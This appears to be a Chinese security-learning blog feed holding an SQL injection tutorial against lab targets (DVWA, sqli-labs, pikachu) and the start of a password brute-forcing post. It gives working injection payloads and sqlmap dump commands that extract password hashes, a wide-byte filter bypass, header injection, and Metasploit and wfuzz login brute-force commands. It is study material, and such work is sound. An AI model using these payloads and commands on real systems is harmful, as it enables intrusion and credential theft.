title="手工注入常规思路"></a>手工注入常规思路</h3><ol><li>判断是否存在注入，注入是字符型还是数字型</li><li>猜解 SQL 查询语句中的字段数 order by N</li><li>确定显示的字段顺序</li><li>获取当前数据库</li><li>获取数据库中的表</li><li>获取表中的字段名</li><li>查询到账户的数据</li></ol><p>详细过程在这不写了，可以看之前的sqli-labs</p><h3 id="union联合注入原理"><a href="#union联合注入原理" class="headerlink" title="union联合注入原理"></a>union联合注入原理</h3><p>联合查询注入是联合两个表进行注入攻击，使用关键词 union select 对两个表进行联合查询。两个表的字段要数要相同，不然会出现报错。</p><p><img src="/2021/08/05/60-zhi-day23/image-20210805192510173.png" alt="image-20210805192510173"></p><p>guestbook有三个字段，users有8个字段，不相同所以会报错。可以把查询users的*换成三个字段即可</p><p><img src="/2021/08/05/60-zhi-day23/image-20210805192722556.png" alt="image-20210805192722556"></p><p>这里的123可以替换成我们想要知道的数据</p><p>同样这里的详细利用略过</p><h3 id="boolean-布尔型盲注入"><a href="#boolean-布尔型盲注入" class="headerlink" title="boolean 布尔型盲注入"></a>boolean 布尔型盲注入</h3><p><strong>代码上来看布尔盲注</strong></p><p>我们分析下dvwa中的布尔盲注源码</p><p><img src="/2021/08/05/60-zhi-day23/image-20210805193229899.png" alt="image-20210805193229899"></p><p>像这种只有正确与错误页面。页面不会显示数据库里任何内容，如果存在注入，叫做盲注入。</p><h3 id="boolean-布尔型注入攻击"><a href="#boolean-布尔型注入攻击" class="headerlink" title="boolean 布尔型注入攻击"></a>boolean 布尔型注入攻击</h3><p>这里我们写下关于布尔盲注的过程，跟之前的文章有所不同，之前是纯手工注，只能猜信息，我们这里使用burp来减轻我们的工作量</p><p>下列都是用<strong>减减空格</strong>(– )注释</p><p><strong>判断是否存在注入</strong></p><p>我们输入1返回exist，加单引号报错，注释后又正常，可能存在注入</p><p>我们通过sleep函数测试</p><pre class="line-numbers language-none"><code class="language-none">1‘ and sleep(5) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/05/60-zhi-day23/image-20210805193806641.png" alt="image-20210805193806641"></p><p>也可查看耗时</p><p><img src="/2021/08/05/60-zhi-day23/image-20210805193942623.png" alt="image-20210805193942623"></p><p><strong>猜测数据库长度</strong></p><p>经过尝试发现为4</p><pre class="line-numbers language-none"><code class="language-none">1'and if(length(database())=4,1,0) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/05/60-zhi-day23/image-20210805194558305.png" alt="image-20210805194558305"></p><p><strong>查库名</strong></p><p>接下来我们就要通过burp工具来减少我们的工作量</p><pre class="line-numbers language-none"><code class="language-none">1'and if(substring(database(),1,1)='d',1,0) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>if判断，正确返回1，错误0</p><p>substring取数据库，第一个1：从1开始，第二个1：取一个</p><p><img src="/2021/08/05/60-zhi-day23/image-20210805195036490.png" alt="image-20210805195036490"></p><p>我们抓包放到intruder</p><p>模式设置为最后一个</p><p>我们每次取一个，然后同后面对比</p><p>所以将第一个1加变量，后面的d加变量</p><p><img src="/2021/08/05/60-zhi-day23/image-20210805195205595.png" alt="image-20210805195205595"></p><p>第一个变量</p><p>长度分别1234</p><p><img src="/2021/08/05/60-zhi-day23/image-20210805195350992.png" alt="image-20210805195350992"></p><p>第二个变量</p><p>放入我们准备的字典</p><blockquote><p>0<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>a<br>b<br>c<br>d<br>e<br>f<br>g<br>h<br>i<br>j<br>k<br>l<br>m<br>n<br>o<br>p<br>q<br>r<br>s<br>t<br>u<br>v<br>w<br>x<br>y<br>z<br>.<br>@<br>_<br>:</p></blockquote><p><img src="/2021/08/05/60-zhi-day23/image-20210805195412200.png" alt="image-20210805195412200"></p><p>将状态为200过滤出来</p><p><img src="/2021/08/05/60-zhi-day23/image-20210805195550183.png" alt="image-20210805195550183"></p><p>拼接出来数据库名为dvwa</p><p><strong>查表名</strong></p><pre class="line-numbers language-none"><code class="language-none">1'and if(substring((select table_name from information_schema.tables where table_schema='dvwa' limit 1),1,1)='g',1,0) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/05/60-zhi-day23/image-20210805200120037.png" alt="image-20210805200120037"></p><p>还是用burp，同上</p><p>这里存在个问题，我们不知道表长是多少，但是一般他长度不会超过40，所以我们对于第一个变量字典设为1-40即可。</p><p><img src="/2021/08/05/60-zhi-day23/image-20210805200325036.png" alt="image-20210805200325036"></p><p>这里我们知道他长度没超过20，设个20偷个懒~~~///(^v^)\\<del>\</del>~</p><p><img src="/2021/08/05/60-zhi-day23/image-20210805200626071.png" alt="image-20210805200626071"></p><p>同样过滤出200</p><p><img src="/2021/08/05/60-zhi-day23/image-20210805200659734.png" alt="image-20210805200659734"></p><p>这里我们想知道的账号密码在另一个user表里，想知道users，操作同此，改为limit 1，1即可</p><p><strong>到这我们为什么不把这个limit后的地方也设为一个变量呢？我们试试</strong></p><pre class="line-numbers language-none"><code class="language-none">1'and if(substring((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1)='g',1,0) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>多个的话就不是limit 1是第一个，limit 0，1才是第一个</p><p><img src="/2021/08/05/60-zhi-day23/image-20210805201340886.png" alt="image-20210805201340886"></p><p>三个变量</p><p><img src="/2021/08/05/60-zhi-day23/image-20210805201451481.png" alt="image-20210805201451481"></p><p>第一个变量，从0到1，共俩个。其他不变</p><p><img src="/2021/08/05/60-zhi-day23/image-20210805201709689.png" alt="image-20210805201709689"></p><p>俩个表都出来了</p><p><strong>查列名</strong></p><p>列名也同上即可</p><pre class="line-numbers language-none"><code class="language-none">1'and if(substring((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='i',1,0) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/05/60-zhi-day23/image-20210805202111402.png" alt="image-20210805202111402"></p><p><img src="/2021/08/05/60-zhi-day23/1.png" alt="1"></p><p>这里查询到的不光是dvwa库中的user，我们需要加一个限制条件 table_schema=database()，这样查询到的就是当前库中的user中的列</p><pre class="line-numbers language-none"><code class="language-none">1'and if(substring((select column_name from information_schema.columns where table_name='users' and table_schema=database() limit 0,1),1,1)='u',1,0) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/05/60-zhi-day23/image-20210805203901140.png" alt="image-20210805203901140"></p><p><img src="/2021/08/05/60-zhi-day23/image-20210805204026300.png" alt="image-20210805204026300"></p><p><img src="/2021/08/05/60-zhi-day23/image-20210805204319087.png" alt="image-20210805204319087"></p><p>这样查询到的就是dvwa库中的user表中的列名</p><p><strong>爆数据</strong></p><pre class="line-numbers language-none"><code class="language-none">1'and if(substring((select concat(user,0x3a,password) from dvwa.users limit 1),1,1)='a',1,0) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/05/60-zhi-day23/image-20210805205931481.png" alt="image-20210805205931481"></p><p><img src="/2021/08/05/60-zhi-day23/image-20210805205956497.png" alt="image-20210805205956497"></p><p><img src="/2021/08/05/60-zhi-day23/image-20210805210016021.png" alt="image-20210805210016021"></p><p>这里查询的第一组结果需要做排序，不难看出用户为admin，密码经过MD5加密</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>数据库显错是指，数据库在执行时，遇到语法不对，会显示报错信息，例如语法错语句 select’</p><p>11064 - You have an error in your SQL syntax; check the manual that corresponds toyour MySQL server version for the right syntax to use near ‘’’ at line 1</p><p>程序开发期间需要告诉使用者某些报错信息 方便管理员进行调试，定位文件错误。</p><p>特别 php 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。在 php 中 使用 mysql_error()函数。如果 SQL 注入存在时，会有报错信息返回，可以采用报错注入。</p><p><strong>代码分析</strong></p><p>我们分析dvwa的报错注入源码</p><p><img src="/2021/08/05/60-zhi-day23/image-20210806112551934.png" alt="image-20210806112551934"></p><p><strong>另一种爆库方法</strong></p><p>输入 1’and info()–+ 显示当前库，原理是</p><p>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ and info()–</p><p>会报错显示当前库不存在这个函数 这样当前库名就显示在页面上。</p><p><img src="/2021/08/05/60-zhi-day23/image-20210806112741385.png" alt="image-20210806112741385"></p><p><strong>substring方法绕过长度限制</strong></p><p>我们之前知道常用的三种报错注入关键字floor、updatexml、extractvalue</p><blockquote><p>floor 限制长度64位</p><p>updatexml 限制长度32位，并且返回不是xml才会生效</p><p>extractvalue 限制长度32位</p></blockquote><p>介绍substring截取方法来拼接得到完整数据</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> password <span class="token keyword">from</span> dvwa<span class="token punctuation">.</span>users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/05/60-zhi-day23/image-20210806113145619.png" alt="image-20210806113145619"></p><p>我们知道MD5加密的长度是32位，这里只显示了31位</p><p>第32位没有显示，通过调整substring截取的范围得到第32位</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> password <span class="token keyword">from</span> dvwa<span class="token punctuation">.</span>users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/05/60-zhi-day23/image-20210806113338977.png" alt="image-20210806113338977"></p><p>这样就拼接出来了我们需要的密码</p><p><strong>获取 mysql 账号和密码</strong></p><p>获取账号和密码需要 root 用户才有足够大的权限</p><pre class="line-numbers language-none"><code class="language-none">select authentication_string from mysql.user limit 1;select(updatexml(1,concat(0x7e,(select (select authentication_string from mysql.userlimit 1 )),0x7e),1))select(updatexml(1,concat(0x7e,(select (substring((select authentication_string frommysql.user limit 1),32,40))),0x7e),1))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>floor方法+burp</strong></p><p>floor长度为64位，可以完整获取内容，不需要截取，所以我们可以通过burp获取</p><p>将limit 0，1中的0设置为变量</p><p><img src="/2021/08/05/60-zhi-day23/image-20210806114301561.png" alt="image-20210806114301561"></p><p><img src="/2021/08/05/60-zhi-day23/image-20210806114317833.png" alt="image-20210806114317833"></p><p><img src="/2021/08/05/60-zhi-day23/image-20210806114345091.png" alt="image-20210806114345091"></p><h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><p><strong>源码分析</strong></p><p>直接获取 name 带进数据库进行查询，但是不管是否存在记录，页面返回都一样</p><p><img src="/2021/08/05/60-zhi-day23/image-20210806114622319.png" alt="image-20210806114622319"></p><p>我们这次来用sqlmap来进行时间盲注</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u"http://192.168.163.146/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" -p name --dbms mysql -v 1 --technique=T --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-u  表示检测的 url</p><p>-p  指定的检测参数</p><p>–dbms 数据库类型</p><p>-v  显示调试模式</p><p>–technique=T 检测方法为时间注入</p><p>–batch 运行过程中选择默认的Y或N</p><p><img src="/2021/08/05/60-zhi-day23/image-20210806115137774.png" alt="image-20210806115137774"></p><p>sqlmap判断它是时间型盲注，接下里获取用户和库名</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u"http://192.168.163.146/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" -p name --dbms mysql --current-user --current-db  -v 1 --technique=T --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>–current-user 获取用户</p><p>–current-db 当前库</p><p><img src="/2021/08/05/60-zhi-day23/image-20210806115433146.png" alt="image-20210806115433146"></p><p>接下来爆库中的表</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u"http://192.168.163.146/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" -p name --dbms mysql --tables -D pikachu  -v 1 --technique=T --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>–tables 爆表</p><p>-D 库名 设置库名</p><p><img src="/2021/08/05/60-zhi-day23/image-20210806115753055.png" alt="image-20210806115753055"></p><p>接下来爆表中列</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u"http://192.168.163.146/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" -p name --dbms mysql --columns -T users -D pikachu  -v 1 --technique=T --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>–columns 爆字段</p><p>-T 表名 设置表名</p><p><img src="/2021/08/05/60-zhi-day23/image-20210806115732948.png" alt="image-20210806115732948"></p><p>接下来爆字段的具体数据</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u"http://192.168.163.146/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" -p name --dbms mysql --dump -C"username,password" -T users -D pikachu  -v 1 --technique=T --batch --threads 10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>–dump 爆数据</p><p>-C “username,password” 设置字段</p><p>–threads 设置线程</p><p><img src="/2021/08/05/60-zhi-day23/image-20210806121332383.png" alt="image-20210806121332383"></p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠查询：堆叠查询可以执行多条 SQL 语句，语句之间以分号(;)隔开，而堆叠注入就是利用此特点，在第二条语句中构造要执行攻击的语句。</p><p>在 mysql 里 mysqli_multi_query 和 mysql_multi_query这两个函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。</p><p>但是堆叠查询只能返回第一条查询信息，不返回后面的信息。</p><pre class="line-numbers language-none"><code class="language-none">select version();select database()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/08/05/60-zhi-day23/image-20210806200352347.png" alt="image-20210806200352347"></p><p>堆叠注入的危害是很大的，可以<strong>任意使用增删改查的语句</strong>，例如删除数据库 修改数据库，添加数据库用户。</p><p>之前的注入不能进行增删改查，所以说堆叠注入危害更大</p><p><strong>分析源码</strong></p><p><img src="/2021/08/05/60-zhi-day23/image-20210806201059776.png" alt="image-20210806201059776"></p><p>详见sqli-labs less 38</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入漏洞是一种在 Web 应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与一次注入攻击漏洞相同的攻击威力。</p><h4 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h4><p>在第一次进行数据库插入数据的时候，仅仅只是使用了addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，但 是 addslashes 有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。</p><p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行下一步的检验和处理，这样就会造成 SQL 的二次注入。</p><p>比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入</p><h4 id="二次注入图解"><a href="#二次注入图解" class="headerlink" title="二次注入图解"></a>二次注入图解</h4><p><img src="/2021/08/05/60-zhi-day23/image-20210806201342996.png" alt="image-20210806201342996"></p><p><strong>分析源码</strong></p><p><img src="/2021/08/05/60-zhi-day23/image-20210806201531516.png" alt="image-20210806201531516"></p><p>mysql_escape_string 函数会将特殊字符进行过滤 如’ 经过转义就成了' 然后用insert into 存入在数据库中。</p><p><strong>login.php的源码</strong></p><p><img src="/2021/08/05/60-zhi-day23/image-20210806201737067.png" alt="image-20210806201737067"></p><p>登录获取用 mysql_escape_string 对输入的参数进行转义</p><p>转义之后在数据库中查找指定的账号和密码 再传入到 session 里。</p><p><strong>pass_change.php的源码</strong></p><p><img src="/2021/08/05/60-zhi-day23/image-20210806201835598.png" alt="image-20210806201835598"></p><p>$_SESSION[‘username’] 赋值给$username，无任何过滤再带入 UPDATE 语句中造成注入。</p><p>整个流程就是注册用户，更改密码时会触法注入。可以看到二次注入比较。通常发生在更改，需要二次带入数据时提交的功能里</p><p>详见sqli-labs less24</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>在 SQL 进行防御的时候，一般会开启 gpc，过滤特殊字符。</p><p>一般情况下开启 gpc 是可以防御很多字符串型的注入，但是如果数据库编码不对，也可以导致 SQL 防御被绕过，达到注入的目的。</p><p>如果数据库设置宽字节字符集 gbk ，会导致宽字节注入，从而逃逸 gpc</p><p>简单来讲:数据库编码与 PHP 编码设置为不同的两个编码那么就有可能产生宽字节注入</p><p>深入的讲：要有宽字节注入漏洞，首先要满足数据库后端使用双/多字节解析 SQL语句，其次还要保证在该种字符集范围中包含低字节位是 0x5C(01011100) 的字符，初步的测试结果 Big5 和 GBK 字符集都是有的， UTF-8 和 GB2312 没有这种字符（也就不存在宽字节注入）。</p><p>gpc绕过：</p><pre class="line-numbers language-none"><code class="language-none">%df%27===(addslashes)===&gt;%df%5c%27===(数据库 GBK)===&gt;運' %df'====================&gt;%df\'=====================&gt;運' <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>分析源码</strong></p><p><img src="/2021/08/05/60-zhi-day23/image-20210806202621306.png" alt="image-20210806202621306"></p><p>首先 check_addlashes 是将特殊字符进行过滤，将’ 变成\‘ </p><p>mysql_query 设置数据库的编码为 gbk， 将 id 参数传入到 SQL 中带入查询。</p><p>传入%df%27 即可逃逸 gpc，故存在宽字节注入</p><p>详见sqli-labs less 32</p><h3 id="COOKIE-注入"><a href="#COOKIE-注入" class="headerlink" title="COOKIE 注入"></a><strong>COOKIE</strong> 注入</h3><p>COOKIE 注入与 GET、POST 注入区别不大，只是传递的方式不一样。</p><p>GET 在url 传递参数、POST 在 POST 正文传递参数和值，COOKIE 在 cookie 头传值。</p><p><img src="/2021/08/05/60-zhi-day23/image-20210806202933368.png" alt="image-20210806202933368"></p><p>get 在 url 栏。即使提交的方法是 post，只要在 url 拦上都可以传递 get。</p><p>post 在正文里 。提交的方法必须存在 post</p><p>cookie 有没有 post 都可以</p><p>分析源码</p><p><img src="/2021/08/05/60-zhi-day23/image-20210806203128021.png" alt="image-20210806203128021"></p><p>$cookee = $_COOKIE[‘uname’];获取值并且保存到$cookie 中，再直接拼接到 sql 带入查询，造成注入。</p><p>详见sqli-labs less 20</p><h3 id="base64-编码注入"><a href="#base64-编码注入" class="headerlink" title="base64 编码注入"></a><strong>base64</strong> 编码注入</h3><blockquote><p>base64 一般用于数据编码进行传输，例如邮件，也用于图片加密存储在网页中。数据编码的好处是，防止数据丢失，也有不少网站使用 base64 进行数据传输，</p><p>如搜索栏 或者 id 接收参数，有可能使用 base64 处理传递的参数。</p></blockquote><p>在 php 中 base64_encode()函数对字符串进行 base64 编码,既然可以编码也可以进行解码，base64_decode()这个函数对 base64 进行解码。</p><p>编码解码流程：</p><pre class="line-numbers language-none"><code class="language-none">1 -&gt;base64 编码-&gt;MQ==-&gt;base64 解密-&gt;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64 编码注入，可以绕过 gpc 注入拦截，因为编码过后的字符串不存在特殊字符。</p><p>编码过后的字符串，在程序中重新被解码，再拼接成 SQL 攻击语句，再执行，从而形式 SQL 注入。</p><p><strong>分析源码</strong></p><p><img src="/2021/08/05/60-zhi-day23/image-20210806203558168.png" alt="image-20210806203558168"></p><p>$cookee = base64_decode($cookee); 将$cookee 传过来的参数进行解码</p><p>$cookee 传递过来的数据必须先进行编码，否则解码不了会导致出错。</p><p>详见sqli-labs less 21</p><h3 id="xff注入攻击"><a href="#xff注入攻击" class="headerlink" title="xff注入攻击"></a>xff注入攻击</h3><p>X-Forwarded-For 简称 XFF 头，它代表了客户端的真实 IP，通过修改他的值就可以伪造客户端 IP。XFF 并不受 gpc 影响，而且开发人员很容易忽略这个 XFF 头，不会对 XFF 头进行过滤。</p><!--?phpecho "xff---".$_SERVER['HTTP_X_FORWARDED_FOR'];?--><p>使用 burpsuite X-Forwarded-for: 9.9.9.9 可以随意设置字符串，如果程序中获取这个值再带入数据库查询 会造成 SQL 注入。</p><p>除了 X-Forwarded-For 还有 HTTP_CLIENT_IP 都可以由客户端控制值，所以服务端接受这两个参数的时候 没有过滤会造成 SQL 注入或者更高的危害。</p><p><strong>代码分析</strong></p><p><img src="/2021/08/05/60-zhi-day23/image-20210814115119767.png" alt="image-20210814115119767"></p><p>getenv(‘HTTP_X_FORWARDED_FOR’)获取远程客户端的HTTP_X_FORWARDED_FOR的值 </p><p>没有进行过滤拼接SQL语句带入查询造成注入。</p><p><strong>详细攻击</strong></p><p>在用户登录注册模块在 HTTP 头信息添加 X-Forwarded-for: 9.9.9.9’ ，用户在注册的时候，如果存在安全隐患 会出现错误页面或者报错。从而导致注册或者登录用户失败。</p><p>burpsuite 抓包 提交 输入检测语句</p><pre class="line-numbers language-none"><code class="language-none">X-Forwarded-for: 127.0.0.1'and 1=1#X-Forwarded-for: 127.0.0.1'and 1=2#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>两次提交返回不一样 存在 SQL 注入漏洞</p><p>获取敏感信息</p><pre class="line-numbers language-none"><code class="language-none">X-Forwarded-for: -127.0.0.1' union select 1,2,user(),(select concat(username,0x3a,password) from users limit 1)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/05/60-zhi-day23/image-20210814115808134.png" alt="image-20210814115808134"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>穷举</title>
      <link href="/2021/08/03/60-zhi-day22/"/>
      <url>/2021/08/03/60-zhi-day22/</url>
      
        <content type="html"><![CDATA[<h1 id="穷举篇"><a href="#穷举篇" class="headerlink" title="穷举篇"></a>穷举篇</h1><span id="more"></span><h2 id="metasploit-穷举模块的使用"><a href="#metasploit-穷举模块的使用" class="headerlink" title="metasploit 穷举模块的使用"></a><strong>metasploit</strong> 穷举模块的使用</h2><p>metasploit 是一个渗透测试集成套件 同样也有穷举模块</p><blockquote><p>auxiliary/scanner/ftp/ftp_login</p><p>auxiliary/scanner/ssh/ssh_login</p><p>auxiliary/scanner/telnet/telnet_login</p><p>auxiliary/scanner/smb/smb_loginauxiliary/scanner/mssql/mssql_login</p><p>auxiliary/scanner/mysql/mysql_login</p><p>auxiliary/scanner/oracle/oracle_login</p><p>auxiliary/scanner/postgres/postgres_login</p><p>auxiliary/scanner/vnc/vnc_login</p><p>auxiliary/scanner/pcanywhere/pcanywhere_login</p><p>auxiliary/scanner/snmp/snmp_login</p></blockquote><p>用法：</p><p><strong>在终端下启动msf：</strong></p><pre class="line-numbers language-none"><code class="language-none">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/03/60-zhi-day22/image-20210803131519881.png" alt="image-20210803131519881"></p><p><strong>使用mssql_login模块：</strong></p><pre class="line-numbers language-none"><code class="language-none">use auxiliary/scanner/mssql/mssql_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/03/60-zhi-day22/image-20210803131630299.png" alt="image-20210803131630299"></p><p><strong>查看需要设置的参数：</strong></p><pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/03/60-zhi-day22/image-20210803131747617.png" alt="image-20210803131747617"></p><p>yes是必须设置的</p><p><strong>设置参数：</strong></p><pre class="line-numbers language-none"><code class="language-none">set RHOSTS 192.168.0.127  设置目标ipset STOP_ON_SUCCESS true  设置成功后结束穷举set PASS_FILE /root/top100.txt  设置密码字典<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再次查看参数看看是否设置进去了</p><p><img src="/2021/08/03/60-zhi-day22/image-20210803132308265.png" alt="image-20210803132308265"></p><p><strong>启动：</strong></p><pre class="line-numbers language-none"><code class="language-none">run   或exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/08/03/60-zhi-day22/image-20210803132341545.png" alt="image-20210803132341545"></p><p>成功穷举出来了</p><h2 id="御剑-RDP-爆破工具的使用"><a href="#御剑-RDP-爆破工具的使用" class="headerlink" title="御剑 RDP 爆破工具的使用"></a><strong>御剑</strong> <strong>RDP</strong> 爆破工具的使用</h2><p><img src="/2021/08/03/60-zhi-day22/image-20210803132436815.png" alt="image-20210803132436815"></p><p>在这里设置信息</p><p><img src="/2021/08/03/60-zhi-day22/image-20210803132505980.png" alt="image-20210803132505980"></p><p><img src="/2021/08/03/60-zhi-day22/image-20210803132537815.png" alt="image-20210803132537815"></p><p><img src="/2021/08/03/60-zhi-day22/image-20210803132601982.png" alt="image-20210803132601982"></p><p>start</p><p><img src="/2021/08/03/60-zhi-day22/image-20210803132626148.png" alt="image-20210803132626148"></p><p>俩个ip对应的账号密码都穷举出来了</p><h2 id="wfuzz-多线程穷举密码"><a href="#wfuzz-多线程穷举密码" class="headerlink" title="wfuzz 多线程穷举密码"></a>wfuzz 多线程穷举密码</h2><p>它是kali下的一个终端工具，相比较bp它可以使用百万字典，</p><p><img src="/2021/08/03/60-zhi-day22/image-20210803132859809.png" alt="image-20210803132859809"></p><p>Usage: wfuzz [options] -z payload,params <url></url></p><p>Examples:</p><p>wfuzz -c -z file,users.txt -z file,pass.txt –sc 200 <a href="http://www.site.com/log.asp?user=FUZZ&amp;pass=FUZ2Z">http://www.site.com/log.asp?user=FUZZ&amp;pass=FUZ2Z</a></p><p>wfuzz -c -z range,1-10 –hc=BBB <a href="http://www.site.com/FUZZ%7Bsomething">http://www.site.com/FUZZ{something</a> not there}wfuzz –script=robots -z list,robots.txt <a href="http://www.webscantest.com/FUZZ">http://www.webscantest.com/FUZZ</a></p><p>wfuzz -c -z file,2019_top100.txt –sc 302 -u</p><p><a href="http://www.c1moon.com/admin/index.php?action=login">http://www.c1moon.com/admin/index.php?action=login</a> -d “user=admin&amp;pw=FUZZ”</p><p>wfuzz -c -z file,2019_top100.txt –hc 404 –hh 1549 -u</p><p><a href="http://www.c1moon.com/admin/index.php?action=login">http://www.c1moon.com/admin/index.php?action=login</a> -d “user=admin&amp;pw=FUZZ”</p><p>wfuzz -c -w /home/kali/csdnpass.txt –hc 404 –hh 1549 -u</p><p><a href="http://www.c1moon.com/admin/index.php?action=login">http://www.c1moon.com/admin/index.php?action=login</a> -d “user=admin&amp;pw=FUZZ”</p><p>帮助文档：</p><p><img src="/2021/08/03/60-zhi-day22/image-20210803133424033.png" alt="image-20210803133424033"></p><p>接下来我们使用此工具</p><p><img src="/2021/08/03/60-zhi-day22/image-20210803133059748.png" alt="image-20210803133059748"></p><p>我们用百万字典来扫第一台靶机的c1后台登录</p><p>file,后不能有空格</p><pre class="line-numbers language-none"><code class="language-none">wfuzz -c -z file,/root/csdnpass.txt --sc 302 -u http://www.c1moon.com/admin/index.php?action=login -d"user=admin&amp;pw=FUZZ"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/03/60-zhi-day22/image-20210803134018779.png" alt="image-20210803134018779"></p><p>也可用-w替代-z</p><pre class="line-numbers language-none"><code class="language-none">wfuzz -c -w /root/csdnpass.txt --sc 302 -u http://www.c1moon.com/admin/index.php?action=login -d"user=admin&amp;pw=FUZZ" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="邮箱密码的穷举"><a href="#邮箱密码的穷举" class="headerlink" title="邮箱密码的穷举"></a>邮箱密码的穷举</h2><p>默认的收发邮件端口信息</p><p>发邮件 pop3 110 加密 995</p><p>收邮件 smtp 25 加密 465</p><h3 id="企业独立搭建的邮服-用-MailCracker-进行破解"><a href="#企业独立搭建的邮服-用-MailCracker-进行破解" class="headerlink" title="企业独立搭建的邮服 用 MailCracker 进行破解"></a>企业独立搭建的邮服 用 